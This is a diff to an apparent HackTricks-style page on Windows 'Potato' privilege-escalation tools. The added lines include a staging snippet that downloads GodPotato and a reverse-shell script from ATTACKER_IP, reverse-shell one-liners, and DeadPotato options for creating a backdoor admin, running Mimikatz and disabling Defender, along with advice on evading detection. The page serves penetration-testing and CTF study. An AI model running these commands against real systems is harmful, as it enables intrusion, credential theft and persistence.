@@ -42,6 +42,7 @@ Operational notes:
 - RoguePotato requires an OXID resolver reachable on TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
 - EfsPotato/SharpEfsPotato abuse MS-EFSR; if one pipe is blocked, try alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).
 - Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; try a different pipe/transport or ensure the target service is running.
+- “Kitchen-sink” forks such as DeadPotato bundle extra payload modules (Mimikatz/SharpHound/Defender off) which touch disk; expect higher EDR detection compared to the slim originals.
 
 ## Quick Demo
 
@@ -160,6 +161,16 @@ EfsPotato <cmd> [pipe]
 
 Notes:
 - Works across Windows 8/8.1–11 and Server 2012–2022 when SeImpersonatePrivilege is present.
+- Grab the binary that matches the installed runtime (e.g., `GodPotato-NET4.exe` on modern Server 2022).
+- If your initial execution primitive is a webshell/UI with short timeouts, stage the payload as a script and ask GodPotato to run it instead of a long inline command.
+
+Quick staging pattern from a writable IIS webroot:
+
+```powershell
+iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
+iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
+./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
+```
 
 ### DCOMPotato
 
@@ -188,6 +199,39 @@ SigmaPotato adds modern niceties like in-memory execution via .NET reflection an
 [SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
 ```
 
+Additional perks in 2024–2025 builds (v1.2.x):
+- Built-in reverse shell flag `--revshell` and removal of the 1024-char PowerShell limit so you can fire long AMSI-bypassing payloads in one go.
+- Reflection-friendly syntax (`[SigmaPotato]::Main()`), plus a rudimentary AV evasion trick via `VirtualAllocExNuma()` to throw off simple heuristics.
+- Separate `SigmaPotatoCore.exe` compiled against .NET 2.0 for PowerShell Core environments.
+
+### DeadPotato (2024 GodPotato rework with modules)
+
+DeadPotato keeps the GodPotato OXID/DCOM impersonation chain but bakes in post-exploitation helpers so operators can immediately take SYSTEM and perform persistence/collection without additional tooling.
+
+Common modules (all require SeImpersonatePrivilege):
+
+- `-cmd "<cmd>"` — spawn arbitrary command as SYSTEM.
+- `-rev <ip:port>` — quick reverse shell.
+- `-newadmin user:pass` — create a local admin for persistence.
+- `-mimi sam|lsa|all` — drop and run Mimikatz to dump credentials (touches disk, noisy).
+- `-sharphound` — run SharpHound collection as SYSTEM.
+- `-defender off` — flip Defender real-time protection (very noisy).
+
+Example one-liners:
+
+```cmd
+# Blind reverse shell
+DeadPotato.exe -rev 10.10.14.7:4444
+
+# Drop an admin for later login
+DeadPotato.exe -newadmin pwned:P@ssw0rd!
+
+# Run SharpHound immediately after priv-esc
+DeadPotato.exe -sharphound
+```
+
+Because it ships extra binaries, expect higher AV/EDR flags; use the slimmer GodPotato/SigmaPotato when stealth matters.
+
 ## References
 
 - [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
@@ -201,7 +245,9 @@ SigmaPotato adds modern niceties like in-memory execution via .NET reflection an
 - [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
 - [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
 - [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
 - [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
 - [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)
 
 {{#include ../../banners/hacktricks-training.md}}
